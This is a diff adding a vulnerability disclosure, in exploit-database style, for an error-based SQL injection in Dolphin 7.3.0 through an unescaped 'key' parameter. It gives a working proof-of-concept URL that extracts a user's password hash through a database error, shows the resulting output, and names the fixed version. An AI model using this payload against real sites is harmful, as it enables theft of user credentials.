@@ -1,0 +1,25 @@
+# Exploit Title: Dolphin 7.3.0 Error Based SQL Injection
+# Date: 20-09-2016
+# Software Link: https://www.boonex.com/
+# Exploit Author: Kacper Szurek
+# Contact: http://twitter.com/KacperSzurek
+# Website: http://security.szurek.pl/
+# Category: webapps
+ 
+1. Description
+
+`$_REQUEST['key']` is not escaped inside `actions.inc.php`.
+
+http://security.szurek.pl/dolphin-730-error-based-sql-injection.html
+
+2. Proof of Concept
+
+http://dolphin/flash/XML.php?module=chat&action=RayzSetMembershipSetting&id=1&_t=41920&key=' UNION select 1, exp(~(select*from(SELECT Password FROM profiles WHERE ID=1)x)); -- a
+
+which is rendered as:
+
+Database access error. Description: DOUBLE value is out of range in 'exp(~((select '%password_here%' from dual)))'<?xml version='1.0' encoding='UTF-8'?><ray><result value="Error saving setting." status="failed" /></ray>
+
+3. Solution:
+   
+Update to version 7.3.1
